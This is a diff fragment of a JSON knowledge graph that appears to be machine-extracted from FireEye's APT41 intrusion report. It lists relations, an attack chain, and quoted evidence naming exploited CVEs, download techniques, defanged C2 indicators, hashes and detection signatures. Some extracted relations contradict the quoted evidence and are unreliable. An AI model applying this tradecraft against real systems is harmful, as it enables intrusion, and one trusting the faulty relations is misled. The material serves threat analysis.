+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_94"
+      ],
+      "primary_evidence_id": "ev_94",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0030",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "retrieves_config",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_logger.zip",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.87,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "retrieves_config",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "config_retrieve",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0031",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "targets",
+      "head_id": "ent_campaign_Host",
+      "tail_id": "ent_victim_telecommunications_organization",
+      "head_type": "Campaign",
+      "tail_type": "Victim",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_4",
+        "ev_7",
+        "ev_38",
+        "ev_55"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "targets",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "evidence_target",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0032",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_malware_BEACON",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.92,
+      "evidence_ids": [
+        "ev_28",
+        "ev_101",
+        "ev_29",
+        "ev_30",
+        "ev_31",
+        "ev_23"
+      ],
+      "primary_evidence_id": "ev_28",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "used",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "event_use, headline_or_event_use; use_head",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON"
+      }
+    },
+    {
+      "id": "rel_0033",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_malware_BITSADMIN",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_24"
+      ],
+      "primary_evidence_id": "ev_24",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "uses_malware",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "sparse_core_use_recovery, headline_or_event_use; use_head",
+        "schema_version": "v4.0-event-refiner",
+        "evidence_span": "In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345."
+      }
+    },
+    {
+      "id": "rel_0034",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_malware_VMProtected_Meterpreter",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.92,
+      "evidence_ids": [
+        "ev_101",
+        "ev_28",
+        "ev_29",
+        "ev_30"
+      ],
+      "primary_evidence_id": "ev_101",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "used",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "report_use_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_101"
+      }
+    },
+    {
+      "id": "rel_0035",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "writes_output",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_logger.zip",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "writes_output",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "collection",
+        "notes": "write_output",
+        "schema_version": "v5.0-event-frame"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "initial_access",
+      "relation_id": "rel_0021",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2019-1652",
+      "evidence_ids": [
+        "ev_73",
+        "ev_15",
+        "ev_16"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "initial_access",
+      "relation_id": "rel_0022",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2019-1653",
+      "evidence_ids": [
+        "ev_73",
+        "ev_15",
+        "ev_16"
+      ]
+    },
+    {
+      "step_id": "step_003",
+      "stage": "initial_access",
+      "relation_id": "rel_0023",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2019-19781",
+      "evidence_ids": [
+        "ev_63",
+        "ev_62",
+        "ev_47"
+      ]
+    },
+    {
+      "step_id": "step_004",
+      "stage": "initial_access",
+      "relation_id": "rel_0024",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2019-3396",
+      "evidence_ids": [
+        "ev_38",
+        "ev_37"
+      ]
+    },
+    {
+      "step_id": "step_005",
+      "stage": "initial_access",
+      "relation_id": "rel_0025",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2020-10189",
+      "evidence_ids": [
+        "ev_18",
+        "ev_77",
+        "ev_22"
+      ]
+    },
+    {
+      "step_id": "step_006",
+      "stage": "initial_access",
+      "relation_id": "rel_0026",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2020-10198",
+      "evidence_ids": [
+        "ev_46",
+        "ev_47"
+      ]
+    },
+    {
+      "step_id": "step_007",
+      "stage": "delivery",
+      "relation_id": "rel_0007",
+      "type": "downloads",
+      "summary": "BITSADMIN downloads install.bat",
+      "evidence_ids": [
+        "ev_24"
+      ]
+    },
+    {
+      "step_id": "step_008",
+      "stage": "delivery",
+      "relation_id": "rel_0008",
+      "type": "downloads",
+      "summary": "Storesyncsvc downloads install.bat",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_009",
+      "stage": "delivery",
+      "relation_id": "rel_0012",
+      "type": "downloads_payload",
+      "summary": "BEACON downloads_payload 2.exe",
+      "evidence_ids": [
+        "ev_29",
+        "ev_101"
+      ]
+    },
+    {
+      "step_id": "step_010",
+      "stage": "delivery",
+      "relation_id": "rel_0013",
+      "type": "downloads_payload",
+      "summary": "BEACON downloads_payload storescyncsvc.dll",
+      "evidence_ids": [
+        "ev_28",
+        "ev_101"
+      ]
+    },
+    {
+      "step_id": "step_011",
+      "stage": "delivery",
+      "relation_id": "rel_0014",
+      "type": "downloads_payload",
+      "summary": "Storesyncsvc downloads_payload logger.zip",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_012",
+      "stage": "delivery",
+      "relation_id": "rel_0015",
+      "type": "downloads_payload",
+      "summary": "VMProtected Meterpreter downloads_payload 2.exe",
+      "evidence_ids": [
+        "ev_100",
+        "ev_29",
+        "ev_99"
+      ]
+    },
+    {
+      "step_id": "step_013",
+      "stage": "delivery",
+      "relation_id": "rel_0016",
+      "type": "drops",
+      "summary": "BEACON drops install.bat",
+      "evidence_ids": [
+        "ev_89"
+      ]
+    },
+    {
+      "step_id": "step_014",
+      "stage": "delivery",
+      "relation_id": "rel_0017",
+      "type": "drops",
+      "summary": "BITSADMIN drops install.bat",
+      "evidence_ids": [
+        "ev_24"
+      ]
+    },
+    {
+      "step_id": "step_015",
+      "stage": "delivery",
+      "relation_id": "rel_0018",
+      "type": "drops",
+      "summary": "Storesyncsvc drops install.bat",
+      "evidence_ids": [
+        "ev_21",
+        "ev_22",
+        "ev_41"
+      ]
+    },
+    {
+      "step_id": "step_016",
+      "stage": "delivery",
+      "relation_id": "rel_0019",
+      "type": "drops",
+      "summary": "Storesyncsvc drops logger.zip",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_017",
+      "stage": "delivery",
+      "relation_id": "rel_0030",
+      "type": "retrieves_config",
+      "summary": "Storesyncsvc retrieves_config logger.zip",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_018",
+      "stage": "execution",
+      "relation_id": "rel_0020",
+      "type": "executes",
+      "summary": "logger.zip executes install.bat",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_019",
+      "stage": "execution",
+      "relation_id": "rel_0027",
+      "type": "loads",
+      "summary": "logger.zip loads install.bat",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_020",
+      "stage": "execution",
+      "relation_id": "rel_0028",
+      "type": "loads",
+      "summary": "logger.zip loads Storesyncsvc",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_021",
+      "stage": "execution",
+      "relation_id": "rel_0029",
+      "type": "loads",
+      "summary": "svchost.exe loads BEACON",
+      "evidence_ids": [
+        "ev_94"
+      ]
+    },
+    {
+      "step_id": "step_022",
+      "stage": "execution",
+      "relation_id": "rel_0032",
+      "type": "uses_malware",
+      "summary": "APT41 uses_malware BEACON",
+      "evidence_ids": [
+        "ev_28",
+        "ev_101",
+        "ev_29"
+      ]
+    },
+    {
+      "step_id": "step_023",
+      "stage": "execution",
+      "relation_id": "rel_0033",
+      "type": "uses_malware",
+      "summary": "APT41 uses_malware BITSADMIN",
+      "evidence_ids": [
+        "ev_24"
+      ]
+    },
+    {
+      "step_id": "step_024",
+      "stage": "execution",
+      "relation_id": "rel_0034",
+      "type": "uses_malware",
+      "summary": "APT41 uses_malware VMProtected Meterpreter",
+      "evidence_ids": [
+        "ev_101",
+        "ev_28",
+        "ev_29"
+      ]
+    },
+    {
+      "step_id": "step_025",
+      "stage": "command_and_control",
+      "relation_id": "rel_0003",
+      "type": "communicates_with",
+      "summary": "BEACON communicates_with github.com",
+      "evidence_ids": [
+        "ev_190",
+        "ev_192"
+      ]
+    },
+    {
+      "step_id": "step_026",
+      "stage": "command_and_control",
+      "relation_id": "rel_0004",
+      "type": "downloads",
+      "summary": "logger.zip downloads install.bat",
+      "evidence_ids": [
+        "ev_22"
+      ]
+    },
+    {
+      "step_id": "step_027",
+      "stage": "command_and_control",
+      "relation_id": "rel_0005",
+      "type": "downloads",
+      "summary": "BEACON downloads 2.exe",
+      "evidence_ids": [
+        "ev_28",
+        "ev_29",
+        "ev_101"
+      ]
+    },
+    {
+      "step_id": "step_028",
+      "stage": "command_and_control",
+      "relation_id": "rel_0006",
+      "type": "downloads",
+      "summary": "BEACON downloads storescyncsvc.dll",
+      "evidence_ids": [
+        "ev_28",
+        "ev_101"
+      ]
+    },
+    {
+      "step_id": "step_029",
+      "stage": "command_and_control",
+      "relation_id": "rel_0009",
+      "type": "downloads",
+      "summary": "Storesyncsvc downloads logger.zip",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_030",
+      "stage": "command_and_control",
+      "relation_id": "rel_0010",
+      "type": "downloads",
+      "summary": "VMProtected Meterpreter downloads 2.exe",
+      "evidence_ids": [
+        "ev_29",
+        "ev_100",
+        "ev_101"
+      ]
+    },
+    {
+      "step_id": "step_031",
+      "stage": "command_and_control",
+      "relation_id": "rel_0011",
+      "type": "downloads",
+      "summary": "VMProtected Meterpreter downloads storescyncsvc.dll",
+      "evidence_ids": [
+        "ev_101"
+      ]
+    },
+    {
+      "step_id": "step_032",
+      "stage": "collection",
+      "relation_id": "rel_0035",
+      "type": "writes_output",
+      "summary": "Storesyncsvc writes_output logger.zip",
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_1",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s1"
+      },
+      "text": "Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_2",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s2"
+      },
+      "text": "Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_5",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s5"
+      },
+      "text": "Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC]) The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_7",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s7"
+      },
+      "text": "One interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_15",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s2"
+      },
+      "text": "Cisco Router Exploitation On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_16",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s3"
+      },
+      "text": "It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s (CVE-2019-1653 and CVE-2019-1652) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_18",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s5"
+      },
+      "text": "Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability) On March 5, 2020, researcher Steven Seeley, published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020- 10189).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_21",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s2"
+      },
+      "text": "FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_22",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s3"
+      },
+      "text": "In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_23",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s4"
+      },
+      "text": "The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_24",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s5"
+      },
+      "text": "In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_25",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s6"
+      },
+      "text": "Parent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_27",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s2"
+      },
+      "text": "Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_28",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s1"
+      },
+      "text": "Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_29",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s2"
+      },
+      "text": "The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_30",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s3"
+      },
+      "text": "The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_31",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s4"
+      },
+      "text": "The downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_37",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s4"
+      },
+      "text": "This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_38",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s5"
+      },
+      "text": "Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_39",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s6"
+      },
+      "text": "While APT41 is a unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_40",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s7"
+      },
+      "text": "Indicators Type Indicator(s) CVE-2019-19781 Exploitation (Citrix Application Delivery Control) 66.42.98[.]220 CVE-2019-19781 exploitation attempts with a payload of ‘file /bin/pwd’",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_41",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "body",
+        "sentence_id": "p8_s1"
+      },
+      "text": "CVE-2020-10189 (Zoho ManageEngine Desktop Central) 74.82.201[.]8 exchange.dumb1[.]com C:\\Windows\\Temp\\storesyncsvc.dll C:\\Windows\\Temp\\install.bat",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_42",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "body",
+        "sentence_id": "p8_s2"
+      },
+      "text": "Certutil.exe downloading 2.exe and/or payloads from 91.208.184[.]78 PowerShell downloading files with Net.WebClient Detecting the Techniques",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_43",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "body",
+        "sentence_id": "p8_s3"
+      },
+      "text": "Platform Signature Name Endpoint Security BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY) CERTUTIL.EXE DOWNLOADER A (UTILITY)",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_46",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s1"
+      },
+      "text": "Network Security Backdoor.Meterpreter DTI.Callback Exploit.CitrixNetScaler Trojan.METASTAGE Exploit.ZohoManageEngine.CVE-2020-10198.Pwner",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_47",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s2"
+      },
+      "text": "Exploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader Helix CITRIX ADC [Suspicious Commands] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt]",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_48",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s3"
+      },
+      "text": "EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success] EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access] EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning]",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_50",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s5"
+      },
+      "text": "MITRE ATT&CK Technique Mapping ATT&CK Techniques Initial Access External Remote Services (T1133), Exploit Public-Facing Application (T1190)",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_51",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s6"
+      },
+      "text": "Execution PowerShell (T1086), Scripting (T1064) Persistence New Service (T1050) Privilege Escalation Exploitation for Privilege Escalation (T1068)",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_52",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s7"
+      },
+      "text": "Defense Evasion BITS Jobs (T1197), Process Injection (T1055) Remote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094), Data Encoding (T1132), Standard Application Layer Protocol (T1071)",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_55",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r1"
+      },
